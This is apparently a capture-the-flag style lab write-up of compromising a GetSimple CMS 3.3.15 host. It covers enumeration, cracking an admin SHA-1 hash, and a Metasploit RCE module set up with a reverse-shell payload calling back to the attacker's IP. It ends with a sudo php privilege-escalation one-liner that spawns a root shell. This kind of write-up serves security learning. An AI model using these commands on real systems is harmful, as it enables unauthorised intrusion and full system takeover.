## Executive Summary

During the assessment of the target (IP: `10.129.42.249`), initial enumeration revealed an exposed Apache web server running GetSimple CMS version 3.3.15. Directory enumeration led to the discovery of an XML file containing hashed administrator credentials. After successfully cracking the hash, authentication was achieved. Initial access was ultimately secured by exploiting a known Remote Code Execution (RCE) vulnerability in the CMS. Privilege escalation to `root` was accomplished by exploiting an insecure `sudo` configuration related to the PHP binary.

## 1. Reconnaissance & Enumeration

### 1.1 Port Scanning

An initial `nmap` scan was executed to identify open ports and services:

Bash

```
nmap -sV --script=http-enum 10.129.42.249
```

**Results:**

- **Port 22/tcp:** OpenSSH 8.2p1 (Ubuntu)
    
- **Port 80/tcp:** Apache httpd 2.4.41 (Ubuntu)
    

### 1.2 Web Enumeration

The `http-enum` script highlighted several interesting directories on the web server:

- `/admin/`
    
- `/backups/`
    
- `/robots.txt`
    
- `/data/`
    

Reviewing `/robots.txt` confirmed the restriction on the `/admin/` path:

Plaintext

```
User-agent: *
Disallow: /admin/
```

Further enumeration of the `/data/` directory (which had directory listing enabled) revealed sensitive user files. Specifically, `/data/users/admin.xml` was retrieved via `curl`:

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<item>
  <USR>admin</USR>
  <NAME/>
  <PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
  <EMAIL>admin@gettingstarted.com</EMAIL>
  <HTMLEDITOR>1</HTMLEDITOR>
  <TIMEZONE/>
  <LANG>en_US</LANG>
</item>
```

## 2. Vulnerability Discovery & Initial Access

### 2.1 Credential Harvesting

The SHA-1 hash `d033e22ae348aeb5660fc2140aec35850c4da997` was extracted from the XML file. Utilizing open-source intelligence (CrackStation), the hash was successfully reversed to the plaintext password: `admin`.

- **Credentials Compromised:** `admin:admin`
    

### 2.2 Exploitation (GetSimple CMS 3.3.15)

Through cache file inspection (`/data/cache/2a4c6447379fba09620ba05582eb61af.txt`) and `WhatWeb` enumeration, the CMS version was confirmed as GetSimple 3.3.15.

A search via `searchsploit` / Metasploit identified a relevant Remote Code Execution module (`exploit/multi/http/getsimplecms_unauth_code_exec`).

**Exploitation execution via Metasploit:**

Bash

```
msf > use exploit/multi/http/getsimplecms_unauth_code_exec
msf exploit(...) > set lhost 10.10.16.226
msf exploit(...) > set rhosts 10.129.42.249
msf exploit(...) > set targeturi /
msf exploit(...) > set payload generic/shell_reverse_tcp
msf exploit(...) > exploit
```

_Note: The initial attempt targeting `/admin` failed. Adjusting the `targeturi` to the root directory `/` yielded a successful connection._

A reverse shell was established as the `www-data` user. The shell was subsequently upgraded to a fully interactive pseudo-TTY using Python.

## 3. Privilege Escalation

### 3.1 Local Enumeration

To identify potential local privilege escalation vectors, automated enumeration (`linpeas.sh` / `LinEnum`) was utilized. The `sudo -l` output revealed a critical misconfiguration:

Plaintext

```
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

The `www-data` user was permitted to execute the `php` binary as `root` without supplying a password.

### 3.2 Root Exploitation

Leveraging documentation from GTFOBins for the `php` binary, the `sudo` privilege was exploited to spawn a root shell:

Bash

```
sudo php -r 'system("/bin/sh -i");'
```

**Verification:**

Bash

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Full system compromise was achieved.